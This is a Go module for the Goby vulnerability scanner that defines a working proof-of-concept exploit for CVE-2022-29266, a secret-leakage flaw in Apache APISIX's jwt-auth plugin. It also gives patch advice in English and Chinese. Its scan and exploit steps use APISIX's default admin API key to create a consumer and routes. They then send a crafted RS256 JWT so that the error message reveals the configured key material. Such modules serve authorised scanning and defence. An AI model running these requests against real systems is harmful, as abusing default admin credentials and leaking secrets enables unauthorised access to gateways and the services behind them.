package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apache APISIX index.html File Sensitive information leakage vulnerability (CVE-2022-29266)",
    "Description": "<p>APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.You can use Apache APISIX to handle traditional north-south traffic, as well as east-west traffic between services. </p>",
    "Impact": "<p>Apache APISIX Sensitive information leakage（CVE-2022-29266）</p>",
    "Recommendation": "<p>1. Upgrade to 2.13.1 and above</p><p>2. Apply the following patch to Apache APISIX and rebuild it:</p><p>This will make this error message no longer contain sensitive information and return a fixed error message to the caller.</p><p>For the current LTS 2.13.x or master:</p><p><a href=\"https://github.com/apache/apisix/pull/6846\">https://github.com/apache/apisix/pull/6846</a></p><p><a href=\"https://github.com/apache/apisix/pull/6847\">https://github.com/apache/apisix/pull/6847</a></p><p><a href=\"https://github.com/apache/apisix/pull/6858\">https://github.com/apache/apisix/pull/6858</a></p><p>For the last LTS 2.10.x:</p><p><a href=\"https://github.com/apache/apisix/pull/6847\">https://github.com/apache/apisix/pull/6847</a></p><p><a href=\"https://github.com/apache/apisix/pull/6855\">https://github.com/apache/apisix/pull/6855</a></p><p>3. Manually modify the version you are using according to the commit above and rebuild it to circumvent the vulnerability.</p>",
    "Product": "apisix",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache APISIX index.html 文件敏感信息泄露漏洞（CVE-2022-29266）",
            "Product": "apisix",
            "Description": "<p><span style=\"color: rgb(63, 63, 63); font-size: 15px;\">Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理</span></p>",
            "Recommendation": "<p style=\"text-align: justify;\">1、厂商已发布补丁修复漏洞，用户请尽快更新至安全版本：2.13.1及以上</p><p style=\"text-align: justify;\">2、将以下补丁应用到 Apache APISIX 并重建它：</p><p style=\"text-align: justify;\">这将使该错误消息不再包含敏感信息，并返回一个固定的错误消息给呼叫者。对于当前的 LTS 2.13.x 或 master：</p><p style=\"text-align: justify;\"><a href=\"https://github.com/apache/apisix/pull/6846\">https://github.com/apache/apisix/pull/6846</a> <a href=\"https://github.com/apache/apisix/pull/6847\">https://github.com/apache/apisix/pull/6847</a> <a href=\"https://github.com/apache/apisix/pull/6858\">https://github.com/apache/apisix/pull/6858</a></p><p style=\"text-align: justify;\">对于最后一个 LTS 2.10.x：</p><p style=\"text-align: justify;\"><a href=\"https://github.com/apache/apisix/pull/6847\">https://github.com/apache/apisix/pull/6847</a> <a href=\"https://github.com/apache/apisix/pull/6855\">https://github.com/apache/apisix/pull/6855</a></p><p style=\"text-align: justify;\">3、根据上面的commit手动修改你正在使用的版本并重建它以规避脆弱性。</p><p style=\"text-align: justify;\"><br>与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。</p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 15px;\">攻击者可以通过向受jwt-auth 插件保护的路由发送不正确的 JSON Web Token，通过错误消息响应获取插件配置的敏感信息。依赖库lua-resty-jwt中的错误逻辑允许将RS256令牌发送到需要HS256令牌的端点，错误响应中包含原始密钥值。</span><br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Apache APISIX index.html File Sensitive information leakage vulnerability (CVE-2022-29266)",
            "Product": "apisix",
            "Description": "<p><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.<span style=\"color: rgb(36, 41, 47); font-size: 16px;\">You can use Apache APISIX to handle traditional north-south traffic, as well as east-west traffic between services.&nbsp;</span></span><br></p>",
            "Recommendation": "<p><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\">1. Upgrade to 2.13.1 and above</span></p><p><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\">2. Apply the following patch to Apache APISIX and rebuild it:</span></p><p><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\">This will make this error message no longer contain sensitive information and return a fixed error message to the caller.</span></p><p><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\">For the current LTS 2.13.x or master:</span></p><p><a href=\"https://github.com/apache/apisix/pull/6846\">https://github.com/apache/apisix/pull/6846</a></p><p><a href=\"https://github.com/apache/apisix/pull/6847\">https://github.com/apache/apisix/pull/6847</a></p><p><a href=\"https://github.com/apache/apisix/pull/6858\">https://github.com/apache/apisix/pull/6858</a></p><p><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\">For the last LTS 2.10.x:</span></p><p><a href=\"https://github.com/apache/apisix/pull/6847\">https://github.com/apache/apisix/pull/6847</a></p><p><a href=\"https://github.com/apache/apisix/pull/6855\">https://github.com/apache/apisix/pull/6855</a></p><p><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\">3. Manually modify the version you are using according to the commit above and rebuild it to circumvent the vulnerability.</span><span style=\"color: rgb(34, 34, 51); font-size: 13.3px;\"><br></span><br></p>",
            "Impact": "<p>Apache APISIX Sensitive information leakage（CVE-2022-29266）</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "banner=\"APISIX\" || header=\"APISIX\"",
    "GobyQuery": "banner=\"APISIX\" || header=\"APISIX\"",
    "Author": "twcjw",
    "Homepage": "https://apisix.apache.org/",
    "DisclosureDate": "2022-04-20",
    "References": [
        "https://lists.apache.org/thread/6qpfyxogbvn18g9xr8g218jjfjbfsbhr"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "4.1",
    "CVEIDs": [
        "CVE-2022-29266"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/apisix/admin/consumers",
                "follow_redirect": false,
                "header": {
                    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n    \"username\": \"jack\",\n    \"plugins\": {\n        \"jwt-auth\": {\n            \"key\": \"user-key\",\n            \"secret\": \"my-secret-key\"\n        }\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jwt-auth",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "201",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            }
                        ]
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "algorithm",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "PUT",
                "uri": "/apisix/admin/routes/jas",
                "follow_redirect": false,
                "header": {
                    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n    \"uri\": \"/apisix/plugin/jwt/sign\",\n    \"plugins\": {\n        \"public-api\": {}\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "plugins",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "public-api",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "201",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "PUT",
                "uri": "/apisix/admin/routes/1",
                "follow_redirect": false,
                "header": {
                    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n    \"methods\": [\"GET\"],\n    \"uri\": \"/index.html\",\n    \"plugins\": {\n        \"jwt-auth\": {}\n    },\n    \"upstream\": {\n        \"type\": \"roundrobin\",\n        \"nodes\": {\n            \"127.0.0.1:80\": 1\n        }\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jwt-auth",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "upstream",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "201",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.html",
                "follow_redirect": false,
                "header": {
                    "Authorization": "eyJ0eXAiOiJKV1QiLCJ4NWMiOlsiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cclxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3WFhLa1hGOThlVEh6ZVJOUGhZK1xyXG54RnBob0dwWE05S2FLbENLdlVYd3Qwd0xBRUowRFwvVFZZbE42NnFRcnlQTXIySmR1RnV1U2tUcUo1cWFnK1U1cVxyXG5cLzJnU0kxKzhwSXR2eWZKVVZWb1wvV1FmOVk5YjFSVms4N1M5QmVJZHF1TE1cLzd1ZUNtZzdrYUpxZW1HK1lhTGd6XHJcbkhGc1wvOEVxSjA0UHJwZkdDR1JhaGhZMnZRTFBLekNcL3BZVW9UWlhHUXhWdGRib1QzRDNtOUxWYmdJV0l6RVFlblxyXG45ZzcySFhTc1FqWkZwWk9vK0tDSkJvaXhzdHY0OFFRUzd0eFR2SlRmdXBYd2MxeTN0NHUrZld4dGJPYktwVXMzXHJcbkluN2Vwc2xsQlJYaHFpWTNYTkhSSzRCTGJxRjBZM1hicHlCQ0I0OVVJOU54eEVMc1oxTXd0MU1cL1lmMnNydE10XHJcbmlRSURBUUFCXHJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSJdLCJhbGciOiJSUzI1NiJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTY1MDY5MzY5Mn0.T"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "public key",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Decode secret is not a valid cert",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/apisix/admin/consumers",
                "follow_redirect": false,
                "header": {
                    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n    \"username\": \"jack\",\n    \"plugins\": {\n        \"jwt-auth\": {\n            \"key\": \"user-key\",\n            \"secret\": \"my-secret-key\"\n        }\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jwt-auth",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "201",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            }
                        ]
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "algorithm",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "PUT",
                "uri": "/apisix/admin/routes/jas",
                "follow_redirect": false,
                "header": {
                    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n    \"uri\": \"/apisix/plugin/jwt/sign\",\n    \"plugins\": {\n        \"public-api\": {}\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "plugins",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "public-api",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "201",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "PUT",
                "uri": "/apisix/admin/routes/1",
                "follow_redirect": false,
                "header": {
                    "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n    \"methods\": [\"GET\"],\n    \"uri\": \"/index.html\",\n    \"plugins\": {\n        \"jwt-auth\": {}\n    },\n    \"upstream\": {\n        \"type\": \"roundrobin\",\n        \"nodes\": {\n            \"127.0.0.1:80\": 1\n        }\n    }\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jwt-auth",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "upstream",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "200",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$code",
                                "operation": "==",
                                "value": "201",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.html",
                "follow_redirect": false,
                "header": {
                    "Authorization": "eyJ0eXAiOiJKV1QiLCJ4NWMiOlsiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cclxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3WFhLa1hGOThlVEh6ZVJOUGhZK1xyXG54RnBob0dwWE05S2FLbENLdlVYd3Qwd0xBRUowRFwvVFZZbE42NnFRcnlQTXIySmR1RnV1U2tUcUo1cWFnK1U1cVxyXG5cLzJnU0kxKzhwSXR2eWZKVVZWb1wvV1FmOVk5YjFSVms4N1M5QmVJZHF1TE1cLzd1ZUNtZzdrYUpxZW1HK1lhTGd6XHJcbkhGc1wvOEVxSjA0UHJwZkdDR1JhaGhZMnZRTFBLekNcL3BZVW9UWlhHUXhWdGRib1QzRDNtOUxWYmdJV0l6RVFlblxyXG45ZzcySFhTc1FqWkZwWk9vK0tDSkJvaXhzdHY0OFFRUzd0eFR2SlRmdXBYd2MxeTN0NHUrZld4dGJPYktwVXMzXHJcbkluN2Vwc2xsQlJYaHFpWTNYTkhSSzRCTGJxRjBZM1hicHlCQ0I0OVVJOU54eEVMc1oxTXd0MU1cL1lmMnNydE10XHJcbmlRSURBUUFCXHJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSJdLCJhbGciOiJSUzI1NiJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTY1MDY5MzY5Mn0.T"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "public key",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Decode secret is not a valid cert",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10359"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
